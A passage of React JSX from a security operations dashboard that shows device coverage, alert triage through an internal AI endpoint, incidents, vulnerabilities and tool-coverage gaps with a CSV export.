                    <div style={{display:'flex',justifyContent:'space-between',alignItems:'flex-start',marginBottom:10}}>
                      <div>
                        <div style={{fontSize:'0.72rem',fontWeight:700,color:'var(--wt-muted)',marginBottom:2}}>Devices</div>
                        <div style={{fontSize:'2rem',fontWeight:900,fontFamily:'JetBrains Mono,monospace',letterSpacing:-2,color:'var(--wt-text)'}}>{totalDevices}</div>
                      </div>
                      <div style={{textAlign:'right'}}>
                        <div style={{fontSize:'0.62rem',fontWeight:700,color:'#f0405e',marginBottom:2}}>{gapDevices.length} with gaps</div>
                        <div style={{fontSize:'0.52rem',color:'var(--wt-dim)'}}>Click to view →</div>
                      </div>
                    </div>
                    <div style={{height:6,background:'var(--wt-border)',borderRadius:3,overflow:'hidden'}}>
                      <div style={{height:'100%',background:'linear-gradient(90deg,#22d49a,#4f8fff)',borderRadius:3,width:`${coveredPct}%`,transition:'width 1s'}} />
                    </div>
                    <div style={{fontSize:'0.6rem',color:'var(--wt-muted)',marginTop:4}}>{coveredPct}% agent coverage</div>
                  </div>

                  {/* Tool Status */}
                  <div onClick={()=>setModal({type:'tools'})} style={{padding:16,background:'var(--wt-card)',border:'1px solid #141820',borderRadius:12,cursor:'pointer',transition:'border-color .15s'}}
                    onMouseEnter={e=>(e.currentTarget).style.borderColor='#4f8fff40'}
                    onMouseLeave={e=>(e.currentTarget).style.borderColor='var(--wt-border)'}>
                    <div style={{display:'flex',justifyContent:'space-between',alignItems:'flex-start',marginBottom:10}}>
                      <div>
                        <div style={{fontSize:'0.72rem',fontWeight:700,color:'var(--wt-muted)',marginBottom:2}}>Tool Status</div>
                        <div style={{fontSize:'2rem',fontWeight:900,fontFamily:'JetBrains Mono,monospace',letterSpacing:-2,color:'#22d49a'}}>{activeTools.length}<span style={{fontSize:'1rem',color:'var(--wt-dim)'}}>/{tools.length}</span></div>
                      </div>
                      <div style={{textAlign:'right'}}>
                        <div style={{fontSize:'0.62rem',fontWeight:700,color:tools.filter(t=>!t.active).length>0?'#f0a030':'#22d49a',marginBottom:2}}>{tools.filter(t=>!t.active).length} inactive</div>
                        <div style={{fontSize:'0.52rem',color:'var(--wt-dim)'}}>Click to manage →</div>
                      </div>
                    </div>
                    <div style={{display:'flex',flexWrap:'wrap',gap:4}}>
                      {tools.map(t=>(
                        <span key={t.id} style={{fontSize:'0.52rem',fontWeight:600,padding:'2px 7px',borderRadius:4,background:t.active?'#22d49a12':'#f0a03012',color:t.active?'#22d49a':'#f0a030',border:`1px solid ${t.active?'#22d49a20':'#f0a03020'}`}}>{t.name}</span>
                      ))}
                    </div>
                  </div>

                  {/* Alert Sources */}
                  <div onClick={()=>setModal({type:'alerts-ingested'})} style={{padding:16,background:'var(--wt-card)',border:'1px solid #141820',borderRadius:12,cursor:'pointer',transition:'border-color .15s'}}
                    onMouseEnter={e=>(e.currentTarget).style.borderColor='#4f8fff40'}
                    onMouseLeave={e=>(e.currentTarget).style.borderColor='var(--wt-border)'}>
                    <div style={{display:'flex',justifyContent:'space-between',alignItems:'flex-start',marginBottom:10}}>
                      <div>
                        <div style={{fontSize:'0.72rem',fontWeight:700,color:'var(--wt-muted)',marginBottom:2}}>Alerts Ingested</div>
                        <div style={{fontSize:'2rem',fontWeight:900,fontFamily:'JetBrains Mono,monospace',letterSpacing:-2,color:'#4f8fff'}}>{alerts.length}</div>
                      </div>
                      <div style={{textAlign:'right'}}>
                        <div style={{fontSize:'0.62rem',fontWeight:700,color:'#f0405e',marginBottom:2}}>{critAlerts.length} critical</div>
                        <div style={{fontSize:'0.52rem',color:'var(--wt-dim)'}}>Click for AI detail →</div>
                      </div>
                    </div>
                    <div style={{display:'flex',gap:6}}>
                      {[{l:'TP',v:tpAlerts.length,c:'#f0405e'},{l:'FP',v:fpAlerts.length,c:'#22d49a'},{l:'SUS',v:alerts.filter(a=>a.verdict==='SUS').length,c:'#f0a030'}].map(s=>(
                        <div key={s.l} style={{flex:1,textAlign:'center',padding:'4px 0',background:'var(--wt-bg)',borderRadius:6}}>
                          <div style={{fontSize:'1rem',fontWeight:900,fontFamily:'JetBrains Mono,monospace',color:s.c}}>{s.v}</div>
                          <div style={{fontSize:'0.5rem',color:'var(--wt-dim)',fontWeight:700}}>{s.l}</div>
                        </div>
                      ))}
                    </div>
                  </div>

                  {/* Vulns / SLA */}
                  <div onClick={()=>setActiveTab('vulns')} style={{padding:16,background:'var(--wt-card)',border:'1px solid #141820',borderRadius:12,cursor:'pointer',transition:'border-color .15s'}}
                    onMouseEnter={e=>(e.currentTarget).style.borderColor='#4f8fff40'}
                    onMouseLeave={e=>(e.currentTarget).style.borderColor='var(--wt-border)'}>
                    <div style={{display:'flex',justifyContent:'space-between',alignItems:'flex-start',marginBottom:10}}>
                      <div>
                        <div style={{fontSize:'0.72rem',fontWeight:700,color:'var(--wt-muted)',marginBottom:2}}>Vulnerabilities</div>
                        <div style={{fontSize:'2rem',fontWeight:900,fontFamily:'JetBrains Mono,monospace',letterSpacing:-2,color:'#f0405e'}}>{vulns.length}</div>
                      </div>
                      <div style={{textAlign:'right'}}>
                        <div style={{fontSize:'0.62rem',fontWeight:700,color:'#f0405e',marginBottom:2}}>{kevVulns.length} KEV — patch now</div>
                        <div style={{fontSize:'0.52rem',color:'var(--wt-dim)'}}>Click for details →</div>
                      </div>
                    </div>
                    <div style={{display:'flex',gap:6}}>
                      {[{l:'Crit',v:critVulns.length,c:'#f0405e'},{l:'High',v:vulns.filter(v=>v.severity==='High').length,c:'#f97316'},{l:'Med',v:vulns.filter(v=>v.severity==='Medium').length,c:'#f0a030'}].map(s=>(
                        <div key={s.l} style={{flex:1,textAlign:'center',padding:'4px 0',background:'var(--wt-bg)',borderRadius:6}}>
                          <div style={{fontSize:'1rem',fontWeight:900,fontFamily:'JetBrains Mono,monospace',color:s.c}}>{s.v}</div>
                          <div style={{fontSize:'0.5rem',color:'var(--wt-dim)',fontWeight:700}}>{s.l}</div>
                        </div>
                      ))}
                    </div>
                  </div>
                </div>
              </div>

              {/* Recent Activity Row */}
              <div style={{display:'grid',gridTemplateColumns:'1fr 1fr',gap:10}}>
                {/* Recent Alerts */}
                <div style={{padding:'14px 16px',background:'var(--wt-card)',border:'1px solid #141820',borderRadius:12}}>
                  <div style={{display:'flex',alignItems:'center',gap:6,marginBottom:10}}>
                    <div style={{fontSize:'0.62rem',fontWeight:700,color:'#4f8fff',textTransform:'uppercase',letterSpacing:'1px',flex:1}}>Recent Alerts</div>
                    <button onClick={()=>setActiveTab('alerts')} style={{fontSize:'0.58rem',color:'#4f8fff',background:'none',border:'none',cursor:'pointer',fontFamily:'Inter,sans-serif',fontWeight:600}}>View all →</button>
                  </div>
                  {alerts.slice(0,4).map(a=>(
                    <div key={a.id} style={{display:'flex',alignItems:'center',gap:8,padding:'5px 0',borderBottom:'1px solid var(--wt-border)'}}>
                      <div style={{width:4,height:24,borderRadius:2,background:SEV_COLOR[a.severity],flexShrink:0}} />
                      <div style={{flex:1,minWidth:0}}>
                        <div style={{fontSize:'0.72rem',fontWeight:600,overflow:'hidden',textOverflow:'ellipsis',whiteSpace:'nowrap'}}>{a.title}</div>
                        <div style={{fontSize:'0.58rem',color:'var(--wt-dim)'}}>{a.source} · {a.device} · {a.time}</div>
                      </div>
                      <span style={{fontSize:'0.52rem',fontWeight:700,padding:'1px 5px',borderRadius:3,background:VERDICT_STYLE[a.verdict].bg,color:VERDICT_STYLE[a.verdict].c,flexShrink:0}}>{a.verdict}</span>
                    </div>
                  ))}
                </div>
                {/* Active Incidents */}
                <div style={{padding:'14px 16px',background:'var(--wt-card)',border:'1px solid #141820',borderRadius:12}}>
                  <div style={{display:'flex',alignItems:'center',gap:6,marginBottom:10}}>
                    <div style={{fontSize:'0.62rem',fontWeight:700,color:'#f0405e',textTransform:'uppercase',letterSpacing:'1px',flex:1}}>Active Incidents</div>
                    <button onClick={()=>setActiveTab('incidents')} style={{fontSize:'0.58rem',color:'#4f8fff',background:'none',border:'none',cursor:'pointer',fontFamily:'Inter,sans-serif',fontWeight:600}}>View all →</button>
                  </div>
                  {incidents.filter(i=>(incidentStatuses[i.id]||i.status)!=='Closed').slice(0,3).map(inc=>(
                    <div key={inc.id} onClick={()=>{setActiveTab('incidents');setSelectedIncident(inc);}} style={{padding:'6px 0',borderBottom:'1px solid var(--wt-border)',cursor:'pointer'}}>
                      <div style={{display:'flex',alignItems:'center',gap:6,marginBottom:2}}>
                        <span style={{fontSize:'0.6rem',fontWeight:700,color:'#4f8fff',fontFamily:'JetBrains Mono,monospace'}}>{inc.id}</span>
                        <SevBadge sev={inc.severity} />
                        <span style={{fontSize:'0.52rem',padding:'1px 5px',borderRadius:3,background:'#f0405e12',color:'#f0405e',fontWeight:700,border:'1px solid #f0405e20'}}>{(incidentStatuses[inc.id]||inc.status).toUpperCase()}</span>
                      </div>
                      <div style={{fontSize:'0.7rem',fontWeight:600,overflow:'hidden',textOverflow:'ellipsis',whiteSpace:'nowrap'}}>{inc.title}</div>
                      <div style={{fontSize:'0.58rem',color:'var(--wt-dim)'}}>{inc.alertCount} alerts · {inc.devices.length} devices</div>
                    </div>
                  ))}
                  {incidents.filter(i=>(incidentStatuses[i.id]||i.status)!=='Closed').length===0 && (
                    <div style={{fontSize:'0.72rem',color:'var(--wt-muted)',padding:'12px 0',textAlign:'center'}}>✓ No active incidents</div>
                  )}
                </div>
              </div>

              {/* Top Active Threats */}
              <div style={{padding:'14px 16px',background:'var(--wt-card)',border:'1px solid #141820',borderRadius:12}}>
                <div style={{display:'flex',alignItems:'center',gap:6,marginBottom:10}}>
                  <div style={{fontSize:'0.62rem',fontWeight:700,color:'#f0a030',textTransform:'uppercase',letterSpacing:'1px',flex:1}}>🔥 Top Threats Right Now</div>
                  <button onClick={()=>setActiveTab('intel')} style={{fontSize:'0.58rem',color:'#4f8fff',background:'none',border:'none',cursor:'pointer',fontFamily:'Inter,sans-serif',fontWeight:600}}>View intel →</button>
                </div>
                <div style={{display:'grid',gridTemplateColumns:'repeat(3,1fr)',gap:8}}>
                  {[
                    {title:'CVE-2024-21413',desc:'Outlook NTLM — CISA KEV',color:'#f0405e',badge:'CRITICAL'},
                    {title:'TA505 Active',desc:'Cobalt Strike campaign — fin. sector',color:'#f0a030',badge:'HIGH'},
                    {title:'LockBit 3.0',desc:'New infra post-takedown',color:'#f0a030',badge:'HIGH'},
                  ].map(t=>(
                    <div key={t.title} style={{padding:'8px 10px',background:'var(--wt-card2)',border:`1px solid ${t.color}18`,borderRadius:8}}>
                      <div style={{fontSize:'0.52rem',fontWeight:800,color:t.color,marginBottom:3}}>{t.badge}</div>
                      <div style={{fontSize:'0.72rem',fontWeight:700,marginBottom:2}}>{t.title}</div>
                      <div style={{fontSize:'0.6rem',color:'var(--wt-muted)'}}>{t.desc}</div>
                    </div>
                  ))}
                </div>
              </div>

              {/* Posture */}
              <div style={{display:'flex',alignItems:'center',gap:12,padding:16,background:'var(--wt-card)',border:'1px solid #141820',borderRadius:12}}>
                <div style={{position:'relative',width:64,height:64,flexShrink:0}}>
                  <svg viewBox='0 0 100 100' style={{width:'100%',height:'100%'}}>
                    <circle cx={50} cy={50} r={42} fill='none' stroke='var(--wt-border)' strokeWidth={8} />
                    <circle cx={50} cy={50} r={42} fill='none' stroke={postureColor} strokeWidth={8} strokeDasharray={`${(posture/100)*264} 264`} strokeLinecap='round' transform='rotate(-90 50 50)' style={{transition:'stroke-dasharray 1s ease'}} />
                  </svg>
                  <div style={{position:'absolute',top:'50%',left:'50%',transform:'translate(-50%,-60%)',fontSize:'1.2rem',fontWeight:900,fontFamily:'JetBrains Mono,monospace',color:postureColor}}>{posture}</div>
                  <div style={{position:'absolute',top:'50%',left:'50%',transform:'translate(-50%,45%)',fontSize:'0.6rem',fontWeight:800,color:postureColor}}>C+</div>
                </div>
                <div>
                  <div style={{fontSize:'0.82rem',fontWeight:700,marginBottom:3}}>Security Posture</div>
                  <div style={{fontSize:'0.74rem',color:'var(--wt-muted)',lineHeight:1.6}}>{critAlerts.length} critical alerts active · {kevVulns.length} KEV patches outstanding · {gapDevices.length} devices uncovered</div>
                  <div style={{fontSize:'0.64rem',color:'#f0a030',marginTop:4}}>⚠ Under pressure — address critical alerts and KEV patches to improve grade</div>
                </div>
              </div>
            </div>
          )}

          {/* ═══════════════════════════════ ALERTS ══════════════════════════════════ */}
          {activeTab==='alerts' && (
            <div style={{display:'flex',flexDirection:'column',gap:8}}>
              <div style={{display:'flex',alignItems:'center',gap:10,marginBottom:4}}>
                <h2 style={{fontSize:'0.88rem',fontWeight:700}}>Live Alerts</h2>
                <span style={{fontSize:'0.62rem',fontWeight:600,padding:'3px 10px',borderRadius:5,background:`${autColor}12`,color:autColor,border:`1px solid ${autColor}20`}}>
                  {'⚡✦🤖'[automation]} {autLabel} — {automationBannerText}
                </span>
                <span style={{marginLeft:'auto',fontSize:'0.7rem',color:'var(--wt-muted)'}}>{alerts.length} total · {fpAlerts.length} auto-closed · {tpAlerts.length} escalated</span>
              </div>
              {alerts.map(alert=>{
                const vStyle = VERDICT_STYLE[alert.verdict];
                const expanded = expandedAlerts.has(alert.id);
                const aiActed = alert.verdict==='FP'||alert.verdict==='TP';
                return (
                  <div key={alert.id} className='alert-card' style={{padding:0,overflow:'hidden'}}>
                    <div style={{display:'flex',alignItems:'center',gap:10,padding:'10px 14px',cursor:'pointer'}} onClick={()=>toggleAlertExpand(alert.id)}>
                      <div style={{width:4,height:36,borderRadius:2,background:SEV_COLOR[alert.severity],flexShrink:0}} />
                      <div style={{flex:1,minWidth:0}}>
                        <div style={{display:'flex',alignItems:'center',gap:6,marginBottom:2}}>
                          <span style={{fontSize:'0.8rem',fontWeight:600,overflow:'hidden',textOverflow:'ellipsis',whiteSpace:'nowrap'}}>{alert.title}</span>
                        </div>
                        <div style={{display:'flex',gap:6,flexWrap:'wrap',alignItems:'center'}}>
                          <SevBadge sev={alert.severity} />
                          <span style={{fontSize:'0.52rem',fontWeight:700,padding:'1px 6px',borderRadius:3,background:'#4f8fff12',color:'#4f8fff',border:'1px solid #4f8fff18'}}>{alert.source}</span>
                          <span style={{fontSize:'0.52rem',color:'var(--wt-dim)',fontFamily:'JetBrains Mono,monospace'}}>{alert.device}</span>
                          <span style={{fontSize:'0.52rem',color:'var(--wt-dim)'}}>{alert.time}</span>
                          {alert.mitre && <span style={{fontSize:'0.48rem',color:'#7c6aff',fontFamily:'JetBrains Mono,monospace'}}>{alert.mitre}</span>}
                        </div>
                      </div>
                      <div style={{display:'flex',alignItems:'center',gap:8,flexShrink:0}}>
                        {aiActed && (
                          <span style={{fontSize:'0.52rem',fontWeight:700,padding:'2px 7px',borderRadius:4,background:'#4f8fff12',color:'#4f8fff',border:'1px solid #4f8fff18',display:'flex',alignItems:'center',gap:4}}>
                            <span style={{width:5,height:5,borderRadius:'50%',background:'#4f8fff',display:'block'}} />AI acted
                          </span>
                        )}
                        <span style={{fontSize:'0.56rem',fontWeight:800,padding:'2px 8px',borderRadius:4,color:vStyle.c,background:vStyle.bg}}>{vStyle.label}</span>
                        <span style={{fontSize:'0.72rem',color:'var(--wt-dim)'}}>{expanded?'▲':'▼'}</span>
                      </div>
                    </div>
                    {expanded && (()=>{
                      // AI triage for live alerts
                      const triage = aiTriageCache[alert.id];
                      const hasBuiltinAI = !!(alert.aiReasoning);
                      const isLiveAlert = !hasBuiltinAI;

                      async function runTriage() {
                        if (triage?.result || triage?.loading) return;
                        setAiTriageCache(prev=>({...prev,[alert.id]:{loading:true}}));
                        try {
                          const prompt = `You are a SOC analyst. Triage this security alert and provide a concise analysis.

Alert: ${alert.title}
Source: ${alert.source}
Severity: ${alert.severity}
Device/Host: ${alert.device || 'Unknown'}
Time: ${alert.time}
${alert.description ? 'Description: '+alert.description : ''}
${alert.ip ? 'IP: '+alert.ip : ''}
${alert.user ? 'User: '+alert.user : ''}
${alert.mitre ? 'MITRE Technique: '+alert.mitre : ''}
Confidence: ${alert.confidence || 'N/A'}%

Respond in this exact format:
VERDICT: [TRUE POSITIVE / FALSE POSITIVE / SUSPICIOUS]
CONFIDENCE: [0-100]%
REASONING: [2-3 sentences explaining your verdict]
EVIDENCE:
- [key evidence point 1]
- [key evidence point 2]
- [key evidence point 3]
ACTIONS:
- [recommended action 1]
- [recommended action 2]
- [recommended action 3]`;

                          const res = await fetch('/api/copilot', {
                            method:'POST',
                            headers:{'Content-Type':'application/json'},
                            body:JSON.stringify({prompt}),
                          });
                          const data = await res.json();
                          if (data.ok && data.response) {
                            const text = data.response;
                            const verdictMatch = text.match(/VERDICT:\s*(.+)/i);
                            const confMatch = text.match(/CONFIDENCE:\s*(\d+)/i);
                            const reasonMatch = text.match(/REASONING:\s*([\s\S]+?)(?=EVIDENCE:|ACTIONS:|$)/i);
                            const evidenceMatch = text.match(/EVIDENCE:\s*([\s\S]+?)(?=ACTIONS:|$)/i);
                            const actionsMatch = text.match(/ACTIONS:\s*([\s\S]+?)$/i);
                            const parseList = (s) => s ? s.split('\n').map(l=>l.replace(/^[-*•\d.]\s*/,'')).filter(l=>l.trim().length>3) : [];
                            setAiTriageCache(prev=>({...prev,[alert.id]:{
                              loading:false,
                              result:{
                                verdict: verdictMatch?.[1]?.trim() || 'SUSPICIOUS',
                                confidence: confMatch?.[1] ? parseInt(confMatch[1]) : 65,
                                reasoning: reasonMatch?.[1]?.trim() || text.slice(0,200),
                                evidence: parseList(evidenceMatch?.[1]),
                                actions: parseList(actionsMatch?.[1]),
                                raw: text,
                              }
                            }}));
                          } else {
                            setAiTriageCache(prev=>({...prev,[alert.id]:{loading:false,error:data.message||'Triage failed'}}));
                          }
                        } catch(e) {
                          setAiTriageCache(prev=>({...prev,[alert.id]:{loading:false,error:e.message}}));
                        }
                      }

                      // Auto-trigger triage for live alerts when expanded
                      if (isLiveAlert && !triage) { runTriage(); }

                      const verdictStyle = {
                        'TRUE POSITIVE': {c:'#f0405e',bg:'#f0405e12',label:'TRUE POSITIVE'},
                        'FALSE POSITIVE': {c:'#22d49a',bg:'#22d49a12',label:'FALSE POSITIVE'},
                        'SUSPICIOUS':     {c:'#f0a030',bg:'#f0a03012',label:'SUSPICIOUS'},
                      }[triage?.result?.verdict?.toUpperCase()] || {c:'#6b7a94',bg:'#6b7a9412',label:'PENDING'};

                      return (
                      <div style={{padding:'0 14px 14px 14px',borderTop:'1px solid #141820'}}>

                        {/* Live alert AI triage panel */}
                        {isLiveAlert && (
                          <div style={{marginTop:12,padding:'12px 14px',background:'linear-gradient(135deg,rgba(79,143,255,0.05),rgba(139,111,255,0.05))',border:'1px solid #4f8fff20',borderRadius:10}}>
                            <div style={{display:'flex',alignItems:'center',gap:8,marginBottom:10}}>
                              <span style={{fontSize:'0.6rem',fontWeight:700,color:'#4f8fff',textTransform:'uppercase',letterSpacing:'0.5px'}}>⚡ AI Triage</span>
                              {triage?.loading && <span style={{fontSize:'0.62rem',color:'#4f8fff',display:'flex',alignItems:'center',gap:5}}><span style={{width:8,height:8,borderRadius:'50%',border:'2px solid #4f8fff',borderTopColor:'transparent',display:'block',animation:'spin 0.8s linear infinite'}}/>Analysing…</span>}
                              {triage?.result && <span style={{fontSize:'0.62rem',fontWeight:800,padding:'2px 10px',borderRadius:5,background:verdictStyle.bg,color:verdictStyle.c,border:`1px solid ${verdictStyle.c}25`}}>{verdictStyle.label} · {triage.result.confidence}%</span>}
                              {triage?.error && <span style={{fontSize:'0.62rem',color:'#f0405e'}}>Triage error — <button onClick={()=>{setAiTriageCache(prev=>({...prev,[alert.id]:undefined}));setTimeout(runTriage,100);}} style={{color:'#4f8fff',background:'none',border:'none',cursor:'pointer',fontSize:'0.62rem',fontFamily:'Inter,sans-serif',padding:0}}>retry</button></span>}
                              {triage?.result && <button onClick={runTriage} style={{marginLeft:'auto',fontSize:'0.58rem',color:'var(--wt-dim)',background:'none',border:'none',cursor:'pointer',fontFamily:'Inter,sans-serif',padding:0}}>↻ Re-triage</button>}
                              {!triage && <button onClick={runTriage} style={{marginLeft:'auto',fontSize:'0.62rem',color:'#4f8fff',background:'#4f8fff10',border:'1px solid #4f8fff25',borderRadius:5,cursor:'pointer',fontFamily:'Inter,sans-serif',padding:'2px 8px'}}>Triage now</button>}
                            </div>

                            {triage?.loading && (
                              <div style={{display:'flex',flexDirection:'column',gap:6}}>
                                {[90,70,55].map((w,i)=>(
                                  <div key={i} style={{height:10,borderRadius:4,background:'var(--wt-border)',width:w+'%',animation:'pulse 1.5s ease infinite',animationDelay:i*0.15+'s'}}/>
                                ))}
                              </div>
                            )}

                            {triage?.result && (
                              <div style={{display:'grid',gridTemplateColumns:'1fr 1fr',gap:12}}>
                                <div>
                                  <div style={{fontSize:'0.68rem',color:'var(--wt-secondary)',lineHeight:1.7,marginBottom:8}}>{triage.result.reasoning}</div>
                                  {triage.result.evidence.length>0 && (
                                    <>
                                      <div style={{fontSize:'0.58rem',fontWeight:700,color:'var(--wt-dim)',textTransform:'uppercase',letterSpacing:'0.5px',marginBottom:5}}>Evidence</div>
                                      {triage.result.evidence.map((e,i)=>(
                                        <div key={i} style={{fontSize:'0.68rem',color:'var(--wt-secondary)',padding:'2px 0 2px 12px',position:'relative'}}>
                                          <span style={{position:'absolute',left:0,top:8,width:5,height:5,borderRadius:'50%',background:'#4f8fff',display:'block'}}/>{e}
                                        </div>
                                      ))}
                                    </>
                                  )}
                                </div>
                                <div>
                                  {triage.result.actions.length>0 && (
                                    <>
                                      <div style={{fontSize:'0.58rem',fontWeight:700,color:'#22d49a',textTransform:'uppercase',letterSpacing:'0.5px',marginBottom:5}}>Recommended Actions</div>
                                      {triage.result.actions.map((a,i)=>(
                                        <div key={i} style={{fontSize:'0.68rem',color:'#22d49a',padding:'2px 0',display:'flex',gap:6}}>
                                          <span style={{fontWeight:700,flexShrink:0,fontSize:'0.58rem',background:'#22d49a15',borderRadius:3,padding:'1px 4px'}}>{i+1}</span><span>{a}</span>
                                        </div>
                                      ))}
                                    </>
                                  )}
                                </div>
                              </div>
                            )}
                          </div>
                        )}

                        {/* Demo alert built-in AI enrichment */}
                        {hasBuiltinAI && (
                        <div style={{display:'grid',gridTemplateColumns:'1fr 1fr',gap:12,marginTop:12}}>
                          <div>
                            <div style={{fontSize:'0.6rem',fontWeight:700,color:'var(--wt-dim)',textTransform:'uppercase',letterSpacing:'0.5px',marginBottom:6}}>AI Reasoning</div>
                            <div style={{fontSize:'0.74rem',color:'var(--wt-secondary)',lineHeight:1.65}}>{alert.aiReasoning}</div>
                            {(alert.evidenceChain||[]).length>0 && (<>
                              <div style={{fontSize:'0.6rem',fontWeight:700,color:'var(--wt-dim)',textTransform:'uppercase',letterSpacing:'0.5px',marginBottom:6,marginTop:10}}>Evidence Chain</div>
                              {(alert.evidenceChain||[]).map(e=>(
                                <div key={e} style={{fontSize:'0.72rem',color:'var(--wt-secondary)',padding:'2px 0 2px 12px',position:'relative'}}>
                                  <span style={{position:'absolute',left:0,top:9,width:5,height:5,borderRadius:'50%',background:'#4f8fff',display:'block'}}/>{e}
                                </div>
                              ))}
                            </>)}
                          </div>
                          <div>
                            {(alert.aiActions||[]).length>0 && (<>
                              <div style={{fontSize:'0.6rem',fontWeight:700,color:'#22d49a',textTransform:'uppercase',letterSpacing:'0.5px',marginBottom:6}}>AI Actions Taken</div>
                              {(alert.aiActions||[]).map(a=>(
                                <div key={a} style={{fontSize:'0.72rem',color:'#22d49a',padding:'2px 0',display:'flex',gap:6}}><span>✓</span><span>{a}</span></div>
                              ))}
                            </>)}
                            {(alert.runbookSteps||[]).length>0 && (<>
                              <div style={{fontSize:'0.6rem',fontWeight:700,color:'var(--wt-dim)',textTransform:'uppercase',letterSpacing:'0.5px',marginBottom:6,marginTop:10}}>Runbook Steps</div>
                              {(alert.runbookSteps||[]).map((s,i)=>(
                                <div key={s} style={{fontSize:'0.72rem',color:'var(--wt-secondary)',padding:'2px 0',display:'flex',gap:6}}>
                                  <span style={{color:'#4f8fff',fontWeight:700,flexShrink:0,fontSize:'0.6rem',background:'#4f8fff15',borderRadius:3,padding:'1px 4px'}}>{i+1}</span><span>{s}</span>
                                </div>
                              ))}
                            </>)}
                            {alert.incidentId && (
                              <button onClick={()=>{ setActiveTab('incidents'); setSelectedIncident(incidents.find(i=>i.id===alert.incidentId)||null); }} style={{marginTop:10,padding:'5px 12px',borderRadius:6,border:'1px solid #4f8fff30',background:'#4f8fff12',color:'#4f8fff',fontSize:'0.72rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>→ View {alert.incidentId}</button>
                            )}
                          </div>
                        </div>
                        )}

                        {/* Live alert metadata (shown alongside AI triage) */}
                        {isLiveAlert && (
                          <div style={{marginTop:10,display:'flex',gap:12,flexWrap:'wrap',fontSize:'0.64rem',color:'var(--wt-muted)'}}>
                            <span>Source: <strong style={{color:'var(--wt-text)'}}>{alert.source}</strong></span>
                            {alert.sourceId && <span style={{fontFamily:'JetBrains Mono,monospace',fontSize:'0.6rem',color:'var(--wt-dim)'}}>ID: {alert.sourceId.slice(0,24)}{alert.sourceId.length>24?'…':''}</span>}
                            {alert.ip && <span>IP: <span style={{fontFamily:'JetBrains Mono,monospace'}}>{alert.ip}</span></span>}
                            {alert.user && <span>User: <strong>{alert.user}</strong></span>}
                            {alert.mitre && <span style={{color:'#7c6aff',fontFamily:'JetBrains Mono,monospace'}}>{alert.mitre}</span>}
                            {(alert.tags||[]).filter(t=>!['taegis','xdr'].includes(t)).map(t=>(
                              <span key={t} style={{padding:'1px 6px',borderRadius:3,background:'#4f8fff12',color:'#4f8fff',border:'1px solid #4f8fff18'}}>{t}</span>
                            ))}
                          </div>
                        )}
                      </div>
                      );
                    })()}
                  </div>
                );
              })}
            </div>
          )}

          {/* ═══════════════════════════════ COVERAGE ═══════════════════════════════ */}
          {activeTab==='coverage' && (
            <div style={{display:'flex',flexDirection:'column',gap:14}}>
              <div style={{display:'flex',alignItems:'center',gap:10,marginBottom:4}}>
                <h2 style={{fontSize:'0.88rem',fontWeight:700}}>Coverage</h2>
                <span style={{fontSize:'0.62rem',color:coveredPct>=90?'#22d49a':'#f0a030',background:coveredPct>=90?'#22d49a12':'#f0a03012',padding:'2px 8px',borderRadius:4}}>{coveredPct}% estate covered</span>
              </div>

              {/* Per-tool coverage */}
              <div>
                <div style={{fontSize:'0.62rem',fontWeight:700,color:'#4f8fff',textTransform:'uppercase',letterSpacing:'1px',marginBottom:8}}>Tool Coverage Across Estate</div>
                <div style={{display:'flex',flexDirection:'column',gap:6}}>
                  {activeTools.map(tool=>{
                    const pct = tool.id==='crowdstrike'?96:tool.id==='defender'?91:tool.id==='darktrace'?100:tool.id==='splunk'?98:tool.id==='tenable'?84:tool.id==='proofpoint'?100:tool.id==='sentinel'?100:88;
                    const gapCount = Math.round(totalDevices*(1-pct/100));
                    const pctColor = pct>=95?'#22d49a':pct>=85?'#f0a030':'#f0405e';
                    return (
                      <div key={tool.id} onClick={()=>setGapToolFilter(gapToolFilter===tool.id?null:tool.id)} style={{padding:'10px 14px',background:gapToolFilter===tool.id?'var(--wt-card2)':'var(--wt-card)',border:`1px solid ${gapToolFilter===tool.id?'#4f8fff40':'#141820'}`,borderRadius:10,display:'flex',alignItems:'center',gap:12,cursor:'pointer'}}>
                        <div style={{width:110,fontSize:'0.76rem',fontWeight:600,flexShrink:0}}>{tool.name}</div>
                        <div style={{flex:1,height:8,background:'var(--wt-border)',borderRadius:4,overflow:'hidden'}}>
                          <div style={{height:'100%',background:`linear-gradient(90deg,${pctColor},${pctColor}aa)`,borderRadius:4,width:`${pct}%`,transition:'width 1s'}} />
                        </div>
                        <span style={{fontSize:'0.72rem',fontWeight:800,fontFamily:'JetBrains Mono,monospace',color:pctColor,minWidth:36,textAlign:'right'}}>{pct}%</span>
                        <span style={{fontSize:'0.6rem',color:'var(--wt-dim)',minWidth:80,textAlign:'right'}}>{gapCount>0?<span style={{color:'#f0a030'}}>{gapCount} devices missing</span>:'Full coverage'}</span>
                      </div>
                    );
                  })}
                </div>
              </div>

              {/* Devices with gaps */}
              <div>
                <div style={{fontSize:'0.62rem',fontWeight:700,color:'#f0405e',textTransform:'uppercase',letterSpacing:'1px',marginBottom:8}}>Devices with Gaps ({gapDevices.length})</div>
                <div style={{display:'flex',flexDirection:'column',gap:6}}>
                  {/* CSV export button */}
                  {gapToolFilter && (
                    <div style={{display:'flex',alignItems:'center',gap:8,marginBottom:8}}>
                      <span style={{fontSize:'0.68rem',color:'#4f8fff',fontWeight:600}}>Showing devices missing {ALL_TOOLS.find(t=>t.id===gapToolFilter)?.name||gapToolFilter}</span>
                      <button onClick={()=>{
                        const filtered = gapDevices.filter(d=>d.missing.some(m=>ALL_TOOLS.find(t=>t.id===gapToolFilter)?.name && m.includes(ALL_TOOLS.find(t=>t.id===gapToolFilter).name.split(' ')[0])));
                        const csv = ['Hostname,IP,OS,Missing Tools,Reason,Last Seen', ...filtered.map(d=>`${d.hostname},${d.ip},${d.os},"${d.missing.join('; ')}","${d.reason}",${d.lastSeen}`)].join('\n');
                        const blob = new Blob([csv],{type:'text/csv'});
                        const url = URL.createObjectURL(blob);
                        const a = document.createElement('a'); a.href=url; a.download=`coverage-gaps-${gapToolFilter}.csv`; a.click();
                        URL.revokeObjectURL(url);
                      }} style={{padding:'3px 10px',borderRadius:5,border:'1px solid #22d49a30',background:'#22d49a10',color:'#22d49a',fontSize:'0.62rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>Export CSV ↓</button>
                      <button onClick={()=>setGapToolFilter(null)} style={{padding:'3px 8px',borderRadius:5,border:'1px solid var(--wt-border)',background:'none',color:'var(--wt-muted)',fontSize:'0.6rem',cursor:'pointer',fontFamily:'Inter,sans-serif'}}>Clear ×</button>
                    </div>
